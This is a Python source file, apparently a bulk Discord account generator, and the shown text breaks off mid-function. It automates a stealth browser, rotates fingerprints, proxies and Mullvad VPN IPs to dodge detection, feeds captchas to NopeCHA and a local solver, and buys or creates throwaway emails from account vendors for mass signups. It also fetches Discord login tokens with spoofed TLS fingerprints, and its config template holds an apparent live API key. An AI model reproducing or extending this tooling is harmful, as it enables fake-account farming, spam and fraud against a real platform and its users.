import asyncio
from datetime import datetime
import hashlib
import os
import shutil
from pathlib import Path
import platform
import re
import sys
import threading
import time
import json
import random
import string
import signal
import tempfile
from typing import Optional, Dict
import requests
import httpx
import tls_client
from colorama import Fore, Style, init
from pystyle import Center
from rich.console import Console
import warnings
import nodriver as uc
from nodriver import cdp
import urllib3
import base64
import logging
import imaplib
import email as email_module
from email.header import decode_header
import psutil

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

async def _cdp_key(tab, key: str, code: str, keycode: int):
    try:
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyDown", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
        await asyncio.sleep(0.05)
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyUp", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
    except Exception:
        pass

def get_brave_path() -> Optional[str]:
    paths = [
        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),
        "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
        "/usr/bin/brave-browser",
        "/usr/bin/brave",
        "/snap/bin/brave",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

BRAVE_PATH = get_brave_path()

if BRAVE_PATH:
    pass
else:
    print("\033[93m[WARN]\033[0m Brave not found — falling back to default Chrome")

NOPECHA_EXT_DIR = Path(__file__).parent / "nopecha_ext"
NOPECHA_KEYS_FILE = Path(__file__).parent / "nopecha_keys.txt"
NOPECHA_KEY_INDEX = 0
NOPECHA_KEY_LOCK = threading.Lock()

def load_nopecha_keys() -> list:
    if not NOPECHA_KEYS_FILE.exists():
        NOPECHA_KEYS_FILE.write_text(
            "# Add your NopeCHA API keys here, one per line\n"
            "# Get keys from https://nopecha.com/setup\n"
        )
        return []
    keys = []
    for line in NOPECHA_KEYS_FILE.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            keys.append(line)
    return keys

def get_current_nopecha_key() -> Optional[str]:
    try:
        if isinstance(config, dict):
            nopecha_config = config.get("nopecha", {})
            if nopecha_config.get("enabled", False) and nopecha_config.get("api_key"):
                key = nopecha_config.get("api_key")
                if key and key != "YOUR_NOPECHA_API_KEY_HERE":
                    return key
    except Exception:
        pass
    
    keys = load_nopecha_keys()
    if not keys:
        return None
    with NOPECHA_KEY_LOCK:
        return keys[NOPECHA_KEY_INDEX % len(keys)]

def rotate_nopecha_key():
    global NOPECHA_KEY_INDEX
    keys = load_nopecha_keys()
    if keys:
        with NOPECHA_KEY_LOCK:
            NOPECHA_KEY_INDEX = (NOPECHA_KEY_INDEX + 1) % len(keys)

def inject_nopecha_key(api_key: str) -> bool:
    if not api_key or not NOPECHA_EXT_DIR.exists():
        return False
    
    try:
        manifest_path = NOPECHA_EXT_DIR / "manifest.json"
        if manifest_path.exists():
            with open(manifest_path, 'r') as f:
                manifest = json.load(f)
            if 'nopecha' not in manifest:
                manifest['nopecha'] = {}
            manifest['nopecha']['key'] = api_key
            with open(manifest_path, 'w') as f:
                json.dump(manifest, f, indent=2)
        
        storage_init_path = NOPECHA_EXT_DIR / "storage_init.js"
        storage_init_code = f"""
// Auto-generated storage initialization for NopeCHA extension
(function() {{
  const nopecha_api_key = '{api_key}';
  chrome.storage.local.set({{'nopecha_key': nopecha_api_key}}, function() {{
    console.log('[NopeCHA Storage] API Key initialized');
  }});
}})();
"""
        with open(storage_init_path, 'w') as f:
            f.write(storage_init_code)
        
        config_path = NOPECHA_EXT_DIR / "nopecha_config.json"
        config_data = {
            'api_key': api_key,
            'enabled': True,
            'timestamp': datetime.now().isoformat()
        }
        with open(config_path, 'w') as f:
            json.dump(config_data, f, indent=2)
        
        return True
    except Exception as e:
        log.warning(f"Inject failed: {e}")
        return False

def download_nopecha_ext() -> Optional[Path]:
    if NOPECHA_EXT_DIR.exists() and (NOPECHA_EXT_DIR / "manifest.json").exists():
        return NOPECHA_EXT_DIR
    import zipfile, io
    zip_url = "https://github.com/NopeCHALLC/nopecha-extension/releases/latest/download/chromium_automation.zip"
    try:
        r = requests.get(zip_url, timeout=60, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code != 200:
            log.warning(f"NopeCHA download failed: HTTP {r.status_code}")
            return None
        NOPECHA_EXT_DIR.mkdir(exist_ok=True)
        with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            z.extractall(NOPECHA_EXT_DIR)
        log.success("NopeCHA extension downloaded!")
        return NOPECHA_EXT_DIR
    except Exception as e:
        log.warning(f"NopeCHA download error: {e}")
        return None

FINGERPRINTS_FILE = Path(__file__).parent / "input/fingerprints.txt"
FINGERPRINTS_INDEX = 0
FINGERPRINTS_LOCK = threading.Lock()
RESERVED_FINGERPRINTS = set()

def load_fingerprints() -> list:
    if not FINGERPRINTS_FILE.exists():
        FINGERPRINTS_FILE.write_text(
            "# Add your fingerprints here, one per line\n"
            "# Each fingerprint will be assigned to one account\n"
        )
        return []
    fingerprints = []
    for line in FINGERPRINTS_FILE.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            fingerprints.append(line)
    return fingerprints

def get_current_fingerprint() -> Optional[str]:
    fingerprints = load_fingerprints()
    if not fingerprints:
        return None
    with FINGERPRINTS_LOCK:
        return fingerprints[FINGERPRINTS_INDEX % len(fingerprints)]

def reserve_fingerprint() -> Optional[str]:
    with FINGERPRINTS_LOCK:
        fingerprints = [f for f in load_fingerprints() if f not in RESERVED_FINGERPRINTS]
        if not fingerprints:
            return None
        fingerprint = fingerprints[0]
        RESERVED_FINGERPRINTS.add(fingerprint)
        return fingerprint

def release_fingerprint(fingerprint: str):
    if not fingerprint:
        return
    with FINGERPRINTS_LOCK:
        RESERVED_FINGERPRINTS.discard(fingerprint)

def consume_fingerprint(fingerprint: str):
    if not fingerprint:
        return
    with FINGERPRINTS_LOCK:
        lines = []
        for line in FINGERPRINTS_FILE.read_text().splitlines():
            stripped = line.strip()
            if stripped and not stripped.startswith('#') and stripped != fingerprint:
                lines.append(line)
        FINGERPRINTS_FILE.write_text("\n".join(lines) + ("\n" if lines else ""))
        RESERVED_FINGERPRINTS.discard(fingerprint)

def rotate_fingerprint():
    global FINGERPRINTS_INDEX
    fingerprints = load_fingerprints()
    if fingerprints:
        with FINGERPRINTS_LOCK:
            FINGERPRINTS_INDEX = (FINGERPRINTS_INDEX + 1) % len(fingerprints)

import subprocess
import psutil

MULLVAD_STATS = {
    'total_rotations': 0,
    'failed_rotations': 0,
    'ip_changes': 0,
    'last_ip': None,
    'last_rotation_time': None,
}

def check_mullvad_installed() -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'version'],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False

def mullvad_kill_stuck_process(timeout: int = 30):
    try:
        for proc in psutil.process_iter(['pid', 'name', 'create_time']):
            try:
                if 'mullvad' in proc.info['name'].lower():
                    runtime = time.time() - proc.info['create_time']
                    if runtime > timeout:
                        proc.kill()
                        log.warning(f"Killed stuck mullvad process (PID: {proc.pid})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception:
        pass

def mullvad_status(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            ['mullvad', 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        status = result.stdout.strip()
        status = re.sub(r'Visible location:[^\r\n]*', '', status, flags=re.IGNORECASE)
        status = re.sub(r'IPv4:[^\r\n]*', '', status, flags=re.IGNORECASE)
        status = re.sub(r'\s{2,}', ' ', status).strip()
        return status
    except subprocess.TimeoutExpired:
        log.warning("mullvad status command timed out")
        mullvad_kill_stuck_process()
        return "timeout"
    except Exception:
        return "unknown"

def mullvad_disconnect(timeout: int = 15, max_attempts: int = 15):
    try:
        subprocess.run(
            ['mullvad', 'disconnect'],
            capture_output=True, text=True, timeout=10
        )
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = mullvad_status(timeout=5)
            if "Disconnected" in status:
                log.info("Mullvad disconnected successfully")
                return
            time.sleep(0.5)
            attempts += 1
        
        if attempts >= max_attempts:
            log.warning(f"Disconnect verification timed out after {attempts} attempts")
    except Exception as e:
        log.warning(f"Mullvad disconnect error: {e}")
        mullvad_kill_stuck_process()

def mullvad_connect(country: str = "us", timeout: int = 30, max_attempts: int = 30) -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'relay', 'set', 'location', country],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log.warning(f"Failed to set Mullvad location to {country}")
            return False

        subprocess.run(
            ['mullvad', 'relay', 'set', 'tunnel-protocol', 'wireguard'],
            capture_output=True, text=True, timeout=10
        )

        subprocess.run(
            ['mullvad', 'connect'],
            capture_output=True, text=True, timeout=10
        )

        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = mullvad_status(timeout=5)
            
            if "Connected" in status:
                log.success(f"Mullvad connected to {country}")
                return True
            
            if "Connecting" in status or "Connecting" in status:
                wait_time = 0.5 if attempts < 5 else 1.0
                time.sleep(wait_time)
            else:
                log.debug(f"Mullvad status: {status}")
                time.sleep(1)
            
            attempts += 1
        
        final_status = mullvad_status(timeout=5)
        log.error(f"Mullvad connection timeout. Final status: {final_status}")
        return False
        
    except subprocess.TimeoutExpired as e:
        log.error(f"Mullvad command timed out: {e}")
        mullvad_kill_stuck_process()
        return False
    except Exception as e:
        log.error(f"Mullvad connect error: {e}")
        return False

def mullvad_get_ip(timeout: int = 15, attempts: int = 3) -> Optional[str]:
    providers = [
        ('https://am.i.mullvad.net/json', 'ip'),
        ('https://api.ipify.org?format=json', 'ip'),
        ('https://ifconfig.me/all.json', 'ip_addr'),
    ]
    
    for attempt in range(attempts):
        for url, key in providers:
            try:
                resp = requests.get(url, timeout=timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    ip = data.get(key, data.get('ip', None))
                    if ip:
                        return ip
            except Exception:
                continue
        
        if attempt < attempts - 1:
            time.sleep(1)
    
    return None

def mullvad_rotate(country: str = "us", max_retries: int = 3, min_rotation_delay: int = 2) -> bool:
    MULLVAD_STATS['total_rotations'] += 1
    
    if MULLVAD_STATS['last_rotation_time']:
        elapsed = time.time() - MULLVAD_STATS['last_rotation_time']
        if elapsed < min_rotation_delay:
            time.sleep(min_rotation_delay - elapsed)
    
    old_ip = MULLVAD_STATS['last_ip']
    
    for attempt in range(max_retries):
        try:
            mullvad_disconnect(timeout=15)
            time.sleep(1)
            
            if not mullvad_connect(country, timeout=30):
                if attempt < max_retries - 1:
                    log.warning(f"Rotation attempt {attempt + 1}/{max_retries} failed, retrying...")
                    time.sleep(2 ** attempt)
                    continue
                else:
                    log.error("Mullvad rotation failed after all retries")
                    MULLVAD_STATS['failed_rotations'] += 1
                    return False
            
            time.sleep(1)
            new_ip = mullvad_get_ip(timeout=15)
            
            if new_ip:
                MULLVAD_STATS['last_ip'] = new_ip
                MULLVAD_STATS['last_rotation_time'] = time.time()
                
                if old_ip and new_ip == old_ip:
                    log.warning(f"IP did not change: {log.mask_ip(new_ip)} (retry {attempt + 1}/{max_retries})")
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                        mullvad_disconnect()
                        continue
                    else:
                        MULLVAD_STATS['failed_rotations'] += 1
                        return False
                else:
                    if old_ip:
                        log.success(f"IP rotated: {log.mask_ip(old_ip)} → {log.mask_ip(new_ip)}")
                    else:
                        log.success(f"VPN connected — IP: {log.mask_ip(new_ip)}")
                    MULLVAD_STATS['ip_changes'] += 1
                    return True
            else:
                log.warning(f"Could not verify IP (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                else:
                    MULLVAD_STATS['failed_rotations'] += 1
                    return False
        
        except Exception as e:
            log.error(f"Rotation error: {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
            else:
                MULLVAD_STATS['failed_rotations'] += 1
                return False
    
    return False

MULLVAD_AVAILABLE = False

def get_mullvad_stats() -> dict:
    stats = MULLVAD_STATS.copy()
    if stats['total_rotations'] > 0:
        stats['success_rate'] = f"{((stats['total_rotations'] - stats['failed_rotations']) / stats['total_rotations'] * 100):.1f}%"
    return stats

def parse_proxy(proxy_string: str) -> Optional[Dict]:
    if not proxy_string:
        return None
    proxy_string = proxy_string.strip()
    if '://' not in proxy_string:
        proxy_string = 'socks5://' + proxy_string
    try:
        from urllib.parse import urlparse
        parsed = urlparse(proxy_string)
        proxy_type = parsed.scheme.lower()
        host = parsed.hostname
        port = parsed.port
        if not host or not port:
            return None
        full_url = proxy_string
        masked_url = proxy_string
        if parsed.username and parsed.password:
            masked_url = f"{proxy_type}://{parsed.username}:***@{host}:{port}"
        return {
            'type': proxy_type,
            'host': host,
            'port': port,
            'full_url': full_url,
            'masked_url': masked_url,
        }
    except Exception:
        return None

def get_browser_proxy_args(proxy_config: Dict) -> list:
    args = []
    if not proxy_config:
        return args
    full_url = proxy_config.get('full_url')
    if full_url:
        args.append(f'--proxy-server={full_url}')
        args.append('--proxy-bypass-list=<-loopback>')
    return args

def get_session_proxy(proxy_config: Dict) -> Optional[Dict]:
    if not proxy_config:
        return None
    full_url = proxy_config.get('full_url')
    if full_url:
        return {'http': full_url, 'https': full_url}
    return None

def load_proxies(config: dict) -> list:
    proxy_config = config.get("proxy", {})
    if not proxy_config.get("enabled", False):
        return []
    proxy_file = proxy_config.get("file", "input/proxies.txt")
    proxy_path = Path(proxy_file)
    if not proxy_path.exists():
        log.warning(f"Proxy file not found: {proxy_file}")
        return []
    try:
        proxies = []
        with open(proxy_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parsed = parse_proxy(line)
                    if parsed:
                        proxies.append(parsed)
        if proxies:
            log.success(f"Loaded {len(proxies)} proxies")
            return proxies
    except Exception as e:
        log.error(f"Error loading proxies: {e}")
    return []

PROXY_LIST = []
PROXY_LIST_LOCK = threading.Lock()

def get_random_proxy() -> Optional[Dict]:
    with PROXY_LIST_LOCK:
        if not PROXY_LIST:
            return None
        return random.choice(PROXY_LIST)

async def fetch_discord_token(email: str, password: str, proxy_config: Dict = None) -> str:
    url = "https://discord.com/api/v9/auth/login"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    payload = {"login": email, "password": password}
    session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
    if proxy_config:
        proxy_dict = get_session_proxy(proxy_config)
        if proxy_dict:
            session.proxies = proxy_dict
    try:
        response = session.post(url, headers=headers, json=payload)
        if response.status_code != 200:
            return ""
        return response.json().get("token", "")
    except:
        return ""

SOLVER_URL = "http://127.0.0.1:5003"
SOLVER_TIMEOUT = 120

def send_captcha_to_solver(task_id: str, page_url: str = "https://discord.com/register", captcha_type: str = "unknown") -> Optional[str]:
    try:
        payload = {
            'task_id': task_id,
            'type': captcha_type,
            'page_url': page_url
        }
        
        response = requests.post(f'{SOLVER_URL}/api/solve', json=payload, timeout=5)
        if response.status_code not in [200, 202]:
            log.warning(f"Solver queue failed: {response.status_code}")
            return None
        
        log.info(f"Captcha task {task_id} sent to solver")
        
        start_time = time.time()
        poll_interval = 2
        while time.time() - start_time < SOLVER_TIMEOUT:
            try:
                result_response = requests.get(f'{SOLVER_URL}/api/result/{task_id}', timeout=5)
                
                if result_response.status_code == 200:
                    data = result_response.json()
                    if data.get('status') == 'completed':
                        token = data.get('token')
                        log.success(f"Captcha solved: {task_id}")
                        return token
            except:
                pass
            
            time.sleep(poll_interval)
        
        log.warning(f"Solver timeout for {task_id}")
        return None
    
    except Exception as e:
        log.error(f"Solver integration error: {e}")
        return None

def check_solver_health() -> bool:
    try:
        response = requests.get(f'{SOLVER_URL}/api/status', timeout=5)
        return response.status_code == 200
    except:
        return False

JS_UTILS = '''
(() => {
    if (window.utils) return;
    
    function setInput(selector, value) {
        const el = document.querySelector(selector);
        if (el) {
            el.value = value;
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
        }
    }
    
    function clickAllCheckboxes() {
        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
        let clicked = 0;
        checkboxes.forEach(cb => {
            if (!cb.checked) {
                cb.click();
                cb.checked = true;
                clicked++;
            }
        });
        return { clicked: clicked, total: checkboxes.length };
    }
    
    function clickElement(selector) {
        const el = document.querySelector(selector);
        if (el) el.click();
    }
    
    window.utils = {
        setInput,
        clickAllCheckboxes,
        clickElement,
    };
})();
'''

LOCK = threading.Lock()
SESSION_TARGET = 0
SESSION_CREATED = 0
SESSION_STOP = False
ACTIVE_WORKERS = 0
WORKER_LOCK = threading.Lock()
COOLDOWN_SECONDS = 60

CONFIG_DIR = Path('input')
CONFIG_PATH = CONFIG_DIR / 'config.json'
OUTPUT_DIR = Path('output')
OUTPUT_DIR.mkdir(exist_ok=True)

def load_or_create_config():
    if not CONFIG_PATH.exists():
        CONFIG_DIR.mkdir(exist_ok=True)
        template_config = {
            "threads": 3,
            "cooldown": 15,
            "provider_selection": "venumzmail",
            "email_providers": {
                "venumzmail": {
                    "enabled": True,
                    "api_key": "",
                    "api_base": "https://api.venumzmail.xyz",
                    "domains": ["lickingpussy.online"]
                },
                "mailcow": {
                    "enabled": False,
                    "mailcow_url": "",
                    "api_key": "",
                    "imap_host": "",
                    "domains": []
                },
                "draxono": {
                    "enabled": True,
                    "api_key": "duk_YYKnMDWB-ExATPzllwgVO3hFtX0icBDET1w4FeVz",
                    "api_base": "https://mail.draxono.in",
                    "domain": "durudraxon.online",
                    "domains": ["durudraxon.online"]
                }
            },
            "proxy": {"enabled": False, "file": "input/proxies.txt"},
            "mullvad": {"enabled": False, "country": "us"},
            "nopecha": {"enabled": False, "api_key": ""}
        }
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(template_config, f, indent=4)
        print(f"\n\033[93m[CONFIG]\033[0m Config created at: {CONFIG_PATH}")
        sys.exit(0)
    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
        return json.load(f)

config = load_or_create_config()
THREAD_COUNT = config.get("threads", 1)
COOLDOWN_SECONDS = config.get("cooldown", 10)

mullvad_config = config.get("mullvad", {})
if mullvad_config.get("enabled", False):
    if check_mullvad_installed():
        MULLVAD_AVAILABLE = True
        THREAD_COUNT = 1
        print(f"\033[92m[INFO]\033[0m Mullvad VPN enabled (country: {mullvad_config.get('country', 'us')})")
        print(f"\033[93m[WARN]\033[0m Threads forced to 1 (VPN is system-wide)")
    else:
        print("\033[91m[ERROR]\033[0m Mullvad CLI not found! Install Mullvad VPN or disable it in config.")
        sys.exit(1)

if sys.platform == 'win32':
    import ctypes
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

GRAY = '\033[90m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RED = '\033[91m'
YELLOW = '\033[93m'
WHITE = '\033[97m'
RESET = '\033[0m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
ORANGE = '\033[38;5;208m'

class Logger:
    def __init__(self):
        self._lock = threading.Lock()

    def _print_inline(self, emoji: str, tag: str, tag_color: str, message: str):
        ts = datetime.now().strftime('%H:%M:%S')
        with self._lock:
            line = f"{GRAY}[{ts}]{RESET} {tag_color}{tag:<10}{RESET} {GRAY}│{RESET} {WHITE}{message}{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()

    def mask_email(self, email: str) -> str:
        if '@' not in email:
            return email
        username, domain = email.split('@', 1)
        masked = (username[:4] if len(username) > 4 else username[0]) + '****'
        return f"{masked}@{domain}"

    def mask_token(self, token: str) -> str:
        return token[:20] + '***' if len(token) > 20 else token

    def mask_ip(self, ip: str) -> str:
        if not ip:
            return ip
        if ':' in ip:
            parts = ip.split(':')
            if len(parts) >= 4:
                return ':'.join(parts[:2]) + ':****:****:****'
            return ':'.join(parts[:2]) + ':****'
        if '.' in ip:
            parts = ip.split('.')
            if len(parts) == 4:
                return f"{parts[0]}.{parts[1]}.***.***"
            if len(parts) == 2:
                return f"{parts[0]}.***"
        return re.sub(r'[0-9]', '*', ip)

    def mask_fingerprint(self, fingerprint: str) -> str:
        if not fingerprint or len(fingerprint) <= 8:
            return '***'
        return fingerprint[:4] + '***' + fingerprint[-4:]

    def hunt(self, message: str):
        self._print_inline("", "HUNT", CYAN, message)

    def solved(self, message: str):
        self._print_inline("", "SOLVED", PURPLE, message)

    def warning(self, message: str):
        self._print_inline("", "WARNING", YELLOW, message)

    def error(self, message: str):
        self._print_inline("", "ERROR", RED, message)

    def info(self, message: str):
        self._print_inline("", "INFO", BLUE, message)

    def success(self, message: str):
        self._print_inline("", "SUCCESS", GREEN, message)

    def debug(self, message: str):
        self._print_inline("", "DEBUG", GRAY, message)

    def batch(self, message: str):
        self._print_inline("", "BATCH", CYAN, message)

    def token_status(self, status: str):
        color_map = {'VALID': GREEN, 'LOCKED': YELLOW, 'INVALID': RED}
        color = color_map.get(status, WHITE)
        ts = datetime.now().strftime('%H:%M:%S')
        with self._lock:
            line = f"{color}TOKEN{RESET:<7} {GRAY}│{RESET} {color}[{status}]{RESET} {GRAY}[{ts}]{RESET}\n"
            sys.stdout.write(line)
            sys.stdout.flush()

log = Logger()

class Hotmail007API:
    def __init__(self, client_key: str):
        self.session = requests.Session()
        self.session.verify = False
        self.client_key = client_key
        self.base_url = "https://gapi.hotmail007.com"
        self.mail_types = ["outlook Trusted", "hotmail"]
    
    def check_balance(self) -> float:
        url = f"{self.base_url}/api/user/balance"
        params = {"clientKey": self.client_key}
        try:
            resp = self.session.get(url, params=params, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("code") == 0:
                    return data.get("data", 0.0)
            return 0.0
        except Exception:
            return 0.0
    
    def get_stock(self, mail_type: str = None) -> int:
        url = f"{self.base_url}/api/mail/getStock"
        params = {}
        if mail_type:
            params["mailType"] = mail_type
        try:
            resp = self.session.get(url, params=params, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("code") == 0:
                    return data.get("data", 0)
            return 0
        except Exception:
            return 0
    
    def buy_email(self) -> dict:
        if not self.client_key:
            return {"success": False, "error": "Missing client_key"}
        
        balance = self.check_balance()
        if balance <= 0:
            return {"success": False, "error": "Insufficient balance"}
        
        log.success(f"Balance: ${balance:.2f}")
        
        for mail_type in self.mail_types:
            stock = self.get_stock(mail_type)
            if stock <= 0:
                continue
            
            url = f"{self.base_url}/api/mail/getMail"
            params = {
                "clientKey": self.client_key,
                "mailType": mail_type,
                "quantity": 1
            }
            try:
                resp = self.session.get(url, params=params, timeout=30)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("code") == 0 and data.get("success"):
                        accounts = data.get("data", [])
                        if accounts:
                            parts = accounts[0].split(":")
                            if len(parts) >= 4:
                                log.success(f"✓ Got {mail_type}: {parts[0]}")
                                return {
                                    "success": True,
                                    "email": parts[0],
                                    "password": parts[1],
                                    "token": parts[2],
                                    "uuid": parts[3] if len(parts) > 3 else ""
                                }
                    else:
                        log.warning(f"API error: {data.get('message', 'Unknown')}")
                else:
                    log.warning(f"HTTP {resp.status_code}")
            except Exception as e:
                pass
        
        return {"success": False, "error": "No accounts available"}

class ZeusXAPI:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.base_url = "https://api.zeus-x.ru"
        self.session = requests.Session()
        self.session.verify = False
    
    def check_balance(self):
        try:
            resp = self.session.get(f"{self.base_url}/balance", params={"apikey": self.api_key}, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("Code") == 0:
                    return data.get("Balance", 0.0)
            return 0.0
        except:
            return 0.0
    
    def get_stock(self):
        try:
            resp = self.session.get(f"{self.base_url}/instock", timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("Code") == 0:
                    stock_list = data.get("Data", [])
                    total_stock = 0
                    for item in stock_list:
                        if "GRAPH_API" in item.get("AccountCode", ""):
                            total_stock += item.get("Instock", 0)
                    return total_stock
            return 0
        except:
            return 0
            
    def buy_email(self):
        if not self.api_key:
            return {"success": False, "error": "Missing api_key"}
        
        mail_types = ["OUTLOOK_TRUSTED_GRAPH_API", "HOTMAIL_TRUSTED_GRAPH_API"]
        last_error = "Unknown Error"
        
        for account_code in mail_types:
            try:
                resp = self.session.get(f"{self.base_url}/purchase", params={"apikey": self.api_key, "accountcode": account_code, "quantity": 1}, timeout=30)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("Code") == 0:
                        accounts = data.get("Data", {}).get("Accounts", [])
                        if accounts:
                            acc = accounts[0]
                            return {
                                "success": True,
                                "email": acc.get("Email", ""),
                                "password": acc.get("Password", ""),
                                "token": acc.get("RefreshToken", ""),
                                "uuid": acc.get("ClientId", "")
                            }
                    last_error = data.get("Message", "Unknown Error")
                else:
                    last_error = f"HTTP {resp.status_code}"
            except Exception as e:
                last_error = str(e)
                
        return {"success": False, "error": last_error}

from typing import List, Any

class MailAPIException(Exception):
    def __init__(self, message: str, status_code: int = None, response_text: str = None):
        super().__init__(message)
        self.status_code = status_code
        self.response_text = response_text

class MailAPI:
    def __init__(self, api_key: str = None, base_url: str = "https://leveragers.xyz"):
        self.base_url = base_url.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Leveragers-API-Client/3.0'
        }
        if self.api_key:
            headers['X-API-KEY'] = self.api_key
        self.session.headers.update(headers)
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Dict[str, Any]:
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.session.request(method, url, **kwargs)
            if response.status_code == 204:
                return {"success": True}
            try:
                data = response.json()
            except json.JSONDecodeError:
                raise MailAPIException(
                    f"Invalid non-JSON response from server", 
                    status_code=response.status_code,
                    response_text=response.text[:500]
                )
            if not response.ok:
                error_msg = data.get('error', data.get('message', f"HTTP {response.status_code}"))
                raise MailAPIException(
                    f"API Error: {error_msg}", 
                    status_code=response.status_code,
                    response_text=response.text
                )
            return data
        except requests.RequestException as e:
            raise MailAPIException(f"Connection failed: {str(e)}")
    
    def generate_email(self, domain: str, alias: Optional[str] = None, is_private: bool = False) -> Dict[str, Any]:
        payload = {
            'domain': domain,
            'is_private': is_private
        }
        if alias:
            payload['alias'] = alias
        return self._request('POST', '/api/mail/generate', json=payload)
    
    def get_inbox(self, email_address: str) -> List[Dict[str, Any]]:
        data = self._request('GET', f'/api/mail/inbox/{email_address}')
        return data.get('emails', [])

    def get_private_inbox(self, email_address: str, password: str) -> List[Dict[str, Any]]:
        payload = {
            'email': email_address,
            'password': password
        }
        data = self._request('POST', '/api/mail/private/inbox', json=payload)
        return data.get('emails', [])

    def list_my_emails(self, page: int = 1, per_page: int = 20) -> Dict[str, Any]:
        return self._request('GET', f'/api/mail/list?page={page}&per_page={per_page}')

class VenumzMailAPI:
    def __init__(self, api_key: str, domain: str = None, api_base: str = None):
        self.api_key = api_key
        self.base_url = api_base or "https://api.venumzmail.xyz"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Content-Type': 'application/json',
            'x-api-key': self.api_key
        })
    
    def generate_email(self, username: str = None, domain: str = None) -> dict:
        if not username:
            adjectives = ['cool', 'epic', 'super', 'mega', 'ultra', 'pro', 'elite', 'master', 'dark', 'light', 'shadow', 'fire', 'ice', 'storm', 'thunder', 'wild', 'crazy', 'fast', 'smart', 'great', 'best', 'top', 'king', 'queen', 'lord', 'sir', 'dame', 'captain', 'general', 'chief', 'major', 'agent', 'spy', 'hunter', 'scout', 'ranger', 'knight', 'wizard', 'mage', 'druid', 'rogue', 'bard', 'cleric', 'paladin', 'warrior', 'berserker', 'guardian', 'sentinel', 'watcher', 'keeper', 'warden']
            nouns = ['gamer', 'player', 'user', 'hero', 'legend', 'champion', 'warrior', 'hunter', 'ranger', 'knight', 'mage', 'rogue', 'bard', 'druid', 'cleric', 'paladin', 'berserker', 'guardian', 'sentinel', 'watcher', 'keeper', 'warden', 'dragon', 'phoenix', 'wolf', 'tiger', 'lion', 'hawk', 'eagle', 'raven', 'falcon', 'viper', 'cobra', 'python', 'shark', 'dolphin', 'whale', 'bear', 'panda', 'fox', 'deer', 'stag', 'horse', 'unicorn', 'pegasus', 'griffin', 'chimera', 'hydra', 'behemoth', 'leviathan', 'zephyr', 'tempest', 'cyclone', 'hurricane', 'typhoon', 'blizzard', 'avalanche', 'volcano', 'earthquake', 'tsunami']
            
            username = f"{random.choice(adjectives)}{random.choice(nouns)}{random.randint(10, 9999)}"
        
        use_domain = domain or "lickingpussy.online"
        
        payload = {
            "count": 1,
            "username": username,
            "domain": use_domain
        }
        
        try:
            resp = self.session.post(f"{self.base_url}/create", json=payload, timeout=30)
            
            if resp.status_code in [200, 201]:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get("success") or data.get("status") == "success":
                            email = f"{username}@{use_domain}"
                            return {
                                "success": True,
                                "email": email,
                                "username": username,
                                "domain": use_domain,
                                "full_response": data
                            }
                        elif data.get("message") == "Email created successfully":
                            email = f"{username}@{use_domain}"
                            return {
                                "success": True,
                                "email": email,
                                "username": username,
